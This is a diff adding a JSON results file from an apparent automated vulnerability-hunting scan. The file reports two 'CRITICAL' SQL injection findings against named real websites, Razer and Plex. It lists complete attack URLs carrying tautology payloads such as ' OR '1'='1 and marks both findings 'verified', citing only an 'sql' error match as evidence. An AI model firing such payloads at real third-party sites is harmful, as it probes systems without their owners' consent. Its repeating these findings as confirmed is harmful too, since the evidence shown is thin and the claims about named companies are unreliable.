@@ -1,0 +1,28 @@
+{
+  "timestamp": "2025-10-19T20:37:09.361806",
+  "test_type": "multi_target_hunting",
+  "targets_tested": 8,
+  "findings": [
+    {
+      "type": "SQL Injection",
+      "severity": "CRITICAL",
+      "target": "Razer",
+      "url": "https://www.razer.com/api/search?id=' OR '1'='1",
+      "payload": "' OR '1'='1",
+      "error_found": "sql",
+      "verified": true,
+      "description": "SQL Injection via id parameter - database error exposed"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "CRITICAL",
+      "target": "Plex",
+      "url": "https://www.plex.tv/api/search?id=' OR '1'='1' --",
+      "payload": "' OR '1'='1' --",
+      "error_found": "sql",
+      "verified": true,
+      "description": "SQL Injection via id parameter - database error exposed"
+    }
+  ],
+  "total_findings": 2
+}
